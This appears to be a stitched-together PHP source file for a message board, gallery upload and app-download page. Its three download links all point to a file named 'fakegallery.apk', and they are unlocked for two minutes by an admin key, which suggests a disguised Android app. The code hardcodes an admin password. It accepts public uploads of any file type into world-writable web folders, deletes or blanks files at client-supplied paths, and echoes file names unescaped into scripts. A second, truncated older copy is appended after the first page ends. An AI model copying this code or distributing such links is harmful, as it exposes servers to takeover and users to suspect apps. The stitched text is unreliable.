<?php
session_start();
$admin_pass = "101049"; 

// Messages files
$msg_file   = "messages.txt";
$admin_file = "admin.txt";

// Upload folders
$public_dir = __DIR__ . "/uploads/public/";
$admin_dir  = __DIR__ . "/uploads/admin/";
if (!file_exists($public_dir)) mkdir($public_dir, 0777, true);
if (!file_exists($admin_dir))  mkdir($admin_dir, 0777, true);

// ✅ App Download Links
$app_links = [
  "App 1" => "https://raw.githubusercontent.com/formodeed/Updateapk/refs/heads/main/fakegallery.apk",
  "App 2" => "https://raw.githubusercontent.com/formodeed/Updateapk/refs/heads/main/fakegallery.apk",
  "App 3" => "https://raw.githubusercontent.com/formodeed/Updateapk/refs/heads/main/fakegallery.apk"
];

// Active download check
$active = false;
if (isset($_SESSION["active_until"]) && time() < $_SESSION["active_until"]) {
    $active = true;
}

// --- Handle POST requests ---
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $action = $_POST["action"] ?? "";
    $msg    = trim($_POST["message"] ?? "");
    $pass   = $_POST["password"] ?? "";
    $index  = intval($_POST["index"] ?? -1);
    $file   = $_POST["file"] ?? "";
    $user   = $_POST["user"] ?? "";

    // Public Message
    if ($action === "public" && $msg !== "") {
        file_put_contents($msg_file, $msg . PHP_EOL, FILE_APPEND);
        exit("ok");
    }

    // Admin Message
    if ($action === "admin" && $msg !== "") {
        if ($pass === $admin_pass) {
            file_put_contents($admin_file, $msg . PHP_EOL, FILE_APPEND);
            exit("ok");
        }
        exit("wrong");
    }

    // Delete Single Message
    if ($action === "delete") {
        if ($pass !== $admin_pass) exit("wrong");
        if (file_exists($file)) {
            $lines = file($file, FILE_IGNORE_NEW_LINES);
            if (isset($lines[$index])) {
                unset($lines[$index]);
                file_put_contents($file, implode(PHP_EOL, $lines) . PHP_EOL);
            }
        }
        exit("ok");
    }

    // Delete All Messages
    if ($action === "deleteAll") {
        if ($pass !== $admin_pass) exit("wrong");
        file_put_contents($file, "");
        exit("ok");
    }

    // File Upload
    if ($action === "upload" && isset($_FILES["upload"])) {
        if ($user === "admin" && $pass !== $admin_pass) exit("wrong");
        $dir = ($user === "admin") ? $admin_dir : $public_dir;
        $name = time() . "_" . basename($_FILES["upload"]["name"]);
        $target = $dir . $name;
        if (move_uploaded_file($_FILES["upload"]["tmp_name"], $target)) exit("ok");
        exit("fail");
    }

    // Delete File
    if ($action === "deleteFile") {
        if ($pass !== $admin_pass) exit("wrong");
        $dir = ($user === "admin") ? $admin_dir : $public_dir;
        $target = $dir . basename($file);
        if (file_exists($target)) {
            unlink($target);
            exit("ok");
        }
        exit("fail");
    }

    // ✅ Activate download links
    if ($action === "activate") {
        if ($pass === $admin_pass) {
            $_SESSION["active_until"] = time() + 120; // 2 minutes
            exit("ok");
        } else {
            exit("wrong");
        }
    }
}

// Load data
$public_msgs = file_exists($msg_file) ? file($msg_file, FILE_IGNORE_NEW_LINES) : [];
$admin_msgs  = file_exists($admin_file) ? file($admin_file, FILE_IGNORE_NEW_LINES) : [];
$public_files = array_diff(scandir($public_dir), [".",".."]);
$admin_files  = array_diff(scandir($admin_dir), [".",".."]);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Messages, Gallery & Downloads</title>
  <style>
    body { font-family: Arial; margin: 20px; }
    .box { border: 1px solid #ccc; padding: 10px; margin-top: 10px; width: 600px; }
    .admin { background: #f9f9f9; }
    .message { margin: 5px 0; padding: 5px; border-bottom: 1px solid #ddd; }
    button { margin-left: 10px; cursor: pointer; }
    input[type=text] { width: 400px; padding: 5px; }
    .gallery { margin-top:20px; }
    .gallery-item { margin:10px 0; }
    .download-box { border:1px solid #ccc; padding:15px; margin:10px; width:250px; display:inline-block; text-align:center; border-radius:8px; background:#f9f9f9; }
    .download-btn { padding:10px 15px; background:green; color:#fff; border:none; border-radius:5px; cursor:pointer; }
    .download-btn:disabled { background:gray; cursor:not-allowed; }
  </style>
</head>
<body>

<!-- Download Section -->
<h2>📥 Applications यहाँ से डाउनलोड करें</h2>
<div id="downloadSection">
  <?php foreach ($app_links as $name => $link): ?>
    <div class="download-box">
      <h3><?= $name ?></h3>
      <?php if ($active): ?>
        <a href="<?= $link ?>" download>
          <button class="download-btn">Download</button>
        </a>
      <?php else: ?>
        <button class="download-btn" disabled>Inactive</button>
      <?php endif; ?>
    </div>
  <?php endforeach; ?>
</div>

<hr>

<!-- Public Messages -->
<h2>📝 Public Message</h2>
<p style="color:blue;font-weight:bold;">कृपया पब्लिक अपना मैसेज यहाँ पर छोड़ें</p>
<form id="publicForm">
  <input type="text" id="publicMessage" placeholder="Write message..." required>
  <button type="submit">Submit</button>
</form>

<div class="box">
  <?php foreach ($public_msgs as $i => $msg): ?>
    <div class="message">
      👉 <?= htmlspecialchars($msg) ?>
      <button onclick="deleteMessage('<?= $msg_file ?>', <?= $i ?>)">Delete</button>
    </div>
  <?php endforeach; ?>
</div>
<?php if (!empty($public_msgs)): ?>
  <button onclick="deleteAll('<?= $msg_file ?>')">Delete All Public</button>
<?php endif; ?>

<!-- Public Gallery -->
<h3>🖼️ Public Gallery Upload</h3>
<form id="publicUploadForm" enctype="multipart/form-data">
  <input type="file" name="upload" accept="image/*,video/*" required>
  <button type="submit">Attach File</button>
</form>
<div class="gallery">
  <?php foreach ($public_files as $f): ?>
    <div class="gallery-item">
      <?php if (preg_match('/\.(jpg|jpeg|png|gif)$/i',$f)): ?>
        <img src="uploads/public/<?= urlencode($f) ?>" width="150">
      <?php elseif (preg_match('/\.(mp4|webm|ogg)$/i',$f)): ?>
        <video src="uploads/public/<?= urlencode($f) ?>" width="200" controls></video>
      <?php endif; ?>
      <button onclick="deleteFile('<?= $f ?>','public')">Delete</button>
    </div>
  <?php endforeach; ?>
</div>

<hr>

<!-- Admin Messages -->
<h2>🔒 Admin Message</h2>
<form id="adminForm">
  <input type="text" id="adminMessage" placeholder="Admin message..." required>
  <button type="submit">Submit</button>
</form>

<div class="box admin">
  <?php foreach ($admin_msgs as $i => $msg): ?>
    <div class="message">
      ✅ <?= htmlspecialchars($msg) ?>
      <button onclick="deleteMessage('<?= $admin_file ?>', <?= $i ?>)">Delete</button>
    </div>
  <?php endforeach; ?>
</div>
<?php if (!empty($admin_msgs)): ?>
  <button onclick="deleteAll('<?= $admin_file ?>')">Delete All Admin</button>
<?php endif; ?>

<!-- Admin Gallery -->
<h3>🖼️ Admin Gallery Upload</h3>
<form id="adminUploadForm" enctype="multipart/form-data">
  <input type="file" name="upload" accept="image/*,video/*" required>
  <button type="submit">Attach File</button>
</form>
<div class="gallery">
  <?php foreach ($admin_files as $f): ?>
    <div class="gallery-item">
      <?php if (preg_match('/\.(jpg|jpeg|png|gif)$/i',$f)): ?>
        <img src="uploads/admin/<?= urlencode($f) ?>" width="150">
      <?php elseif (preg_match('/\.(mp4|webm|ogg)$/i',$f)): ?>
        <video src="uploads/admin/<?= urlencode($f) ?>" width="200" controls></video>
      <?php endif; ?>
      <button onclick="deleteFile('<?= $f ?>','admin')">Delete</button>
    </div>
  <?php endforeach; ?>
</div>

<hr>

<!-- Admin Panel -->
<h2>🔑 Admin Panel</h2>
<button onclick="activateLinks()">Activate Key (2 Minutes)</button>

<br><br><button onclick="location.reload()">🔄 Refresh</button>

<script>
const publicForm = document.getElementById("publicForm");
const adminForm  = document.getElementById("adminForm");
const publicUploadForm = document.getElementById("publicUploadForm");
const adminUploadForm  = document.getElementById("adminUploadForm");

// Public Form
publicForm.addEventListener("submit", async e => {
  e.preventDefault();
  let msg = document.getElementById("publicMessage").value;
  let data = new URLSearchParams({ action: "public", message: msg });
  await fetch("", { method:"POST", body:data });
  location.reload();
});

// Admin Form
adminForm.addEventListener("submit", async e => {
  e.preventDefault();
  let msg = document.getElementById("adminMessage").value;
  let pass = prompt("Enter Admin Password:");
  if (!pass) return;
  let data = new URLSearchParams({ action: "admin", message: msg, password: pass });
  let res  = await fetch("", { method:"POST", body:data });
  let txt  = await res.text();
  if (txt === "wrong") alert("❌ Wrong Password");
  else location.reload();
});

// Delete Single Message
async function deleteMessage(file, index) {
  let pass = prompt("Enter Admin Password:");
  if (!pass) return;
  let data = new URLSearchParams({ action:"delete", file:file, index:index, password:pass });
  let res  = await fetch("", { method:"POST", body:data });
  let txt  = await res.text();
  if (txt === "wrong") alert("❌ Wrong Password");
  else location.reload();
}

// Delete All
async function deleteAll(file) {
  let pass = prompt("Enter Admin Password:");
  if (!pass) return;
  let data = new URLSearchParams({ action:"deleteAll", file:file, password:pass });
  let res  = await fetch("", { method:"POST", body:data });
  let txt  = await res.text();
  if (txt === "wrong") alert("❌ Wrong Password");
  else location.reload();
}

// Public Upload
publicUploadForm.addEventListener("submit", async e => {
  e.preventDefault();
  let formData = new FormData(publicUploadForm);
  formData.append("action","upload");
  formData.append("user","public");
  let res = await fetch("", { method:"POST", body:formData });
  let txt = await res.text();
  if (txt === "ok") location.reload();
  else alert("❌ Upload Failed");
});

// Admin Upload
adminUploadForm.addEventListener("submit", async e => {
  e.preventDefault();
  let formData = new FormData(adminUploadForm);
  formData.append("action","upload");
  formData.append("user","admin");
  let pass = prompt("Enter Admin Password:");
  if (!pass) return;
  formData.append("password",pass);
  let res = await fetch("", { method:"POST", body:formData });
  let txt = await res.text();
  if (txt === "wrong") alert("❌ Wrong Password");
  else if (txt === "ok") location.reload();
  else alert("❌ Upload Failed");
});

// Delete File
async function deleteFile(filename,user) {
  let pass = prompt("Enter Admin Password:");
  if (!pass) return;
  let data = new URLSearchParams({ action:"deleteFile", file:filename, user:user, password:pass });
  let res = await fetch("", { method:"POST", body:data });
  let txt = await res.text();
  if (txt === "wrong") alert("❌ Wrong Password");
  else location.reload();
}

// Activate Links
async function activateLinks() {
  let pass = prompt("Enter Admin Password:");
  if (!pass) return;
  let data = new URLSearchParams({ action:"activate", password:pass });
  let res  = await fetch("", { method:"POST", body:data });
  let txt  = await res.text();
  if (txt=="ok") { alert("✅ Links Activated for 2 minutes"); location.reload(); }
  else alert("❌ Wrong Password");
}
</script>
</body>
</html>                file_put_contents($file, implode(PHP_EOL, $lines) . PHP_EOL);
            }
        }
        exit("ok");
    }

    // ✅ Delete All Messages
    if ($action === "deleteAll") {
        if ($pass !== $admin_pass) exit("wrong");
        file_put_contents($file, ""); // clear file
        exit("ok");
    }
}

// --- Load Messages ---
$public_msgs = file_exists($msg_file) ? file($msg_file, FILE_IGNORE_NEW_LINES) : [];
$admin_msgs  = file_exists($admin_file) ? file($admin_file, FILE_IGNORE_NEW_LINES) : [];
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Public & Admin Form</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; }
    .box { border: 1px solid #ccc; padding: 10px; margin-top: 10px; width: 500px; }
    .admin { background: #f9f9f9; }
    .message { margin: 5px 0; padding: 5px; border-bottom: 1px solid #ddd; }
    button.delete { margin-left: 10px; color: red; cursor: pointer; }
    .refresh-btn { margin-top: 20px; padding: 8px 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 5px; }
    .refresh-btn:hover { background: #0056b3; }
    .delete-all { margin-top: 10px; background: red; color: #fff; border: none; padding: 8px 15px; cursor: pointer; border-radius: 5px; }
    .delete-all:hover { background: darkred; }
  </style>
</head>
<body>

  <h2>📝 Public Form (For Everyone)</h2>
  <form id="publicForm">
    <input type="text" id="publicMessage" placeholder="Write your message..." required>
    <button type="submit">Submit</button>
  </form>

  <h3>📢 Public Messages:</h3>
  <div id="publicMessages" class="box">
    <?php foreach ($public_msgs as $i => $msg): ?>
      <div class="message">
        👉 <?= htmlspecialchars($msg) ?>
        <button class="delete" onclick="deleteMessage('<?= $msg_file ?>', <?= $i ?>)">Delete</button>
      </div>
    <?php endforeach; ?>
  </div>
  <?php if (!empty($public_msgs)): ?>
    <button class="delete-all" onclick="deleteAll('<?= $msg_file ?>')">🗑️ Delete All Public Messages</button>
  <?php endif; ?>

  <hr>

  <h2>🔒 Admin Form (Only for Admin)</h2>
  <form id="adminForm">
    <input type="password" id="adminPassword" placeholder="Enter Admin Password" required><br><br>
    <textarea id="adminMessage" placeholder="Write admin message..." required></textarea><br>
    <button type="submit">Submit as Admin</button>
  </form>

  <h3>👑 Admin Messages:</h3>
  <div id="adminMessages" class="box admin">
    <?php foreach ($admin_msgs as $i => $msg): ?>
      <div class="message">
        ✅ <?= htmlspecialchars($msg) ?>
        <button class="delete" onclick="deleteMessage('<?= $admin_file ?>', <?= $i ?>)">Delete</button>
      </div>
    <?php endforeach; ?>
  </div>
  <?php if (!empty($admin_msgs)): ?>
    <button class="delete-all" onclick="deleteAll('<?= $admin_file ?>')">🗑️ Delete All Admin Messages</button>
  <?php endif; ?>

  <!-- ✅ Refresh Button -->
  <button class="refresh-btn" onclick="location.reload()">🔄 Refresh Page</button>

<script>
const publicForm = document.getElementById("publicForm");
const adminForm  = document.getElementById("adminForm");

// Public Form Submit
publicForm.addEventListener("submit", async function(e) {
  e.preventDefault();
  let msg = document.getElementById("publicMessage").value;
  let data = new URLSearchParams({ action: "public", message: msg });
  await fetch("", { method: "POST", body: data });
  location.reload();
});

// Admin Form Submit
adminForm.addEventListener("submit", async function(e) {
  e.preventDefault();
  let msg  = document.getElementById("adminMessage").value;
  let pass = document.getElementById("adminPassword").value;
  let data = new URLSearchParams({ action: "admin", message: msg, password: pass });
  let res  = await fetch("", { method: "POST", body: data });
  let txt  = await res.text();
  if (txt === "wrong") {
    alert("❌ Wrong Admin Password");
  } else {
    location.reload();
  }
});

// Delete Single Message with Popup
async function deleteMessage(file, index) {
  let pass = prompt("Enter Admin Password to delete:");
  if (!pass) return;
  let data = new URLSearchParams({ action: "delete", file, index, password: pass });
  let res  = await fetch("", { method: "POST", body: data });
  let txt  = await res.text();
  if (txt === "wrong") {
    alert("❌ Wrong Password! Cannot delete.");
  } else {
    location.reload();
  }
}

// ✅ Delete All Messages with Popup
async function deleteAll(file) {
  let pass = prompt("Enter Admin Password to delete all:");
  if (!pass) return;
  let data = new URLSearchParams({ action: "deleteAll", file, password: pass });
  let res  = await fetch("", { method: "POST", body: data });
  let txt  = await res.text();
  if (txt === "wrong") {
    alert("❌ Wrong Password! Cannot delete.");
  } else {
    location.reload();
  }
}
</script>

</body>
</html
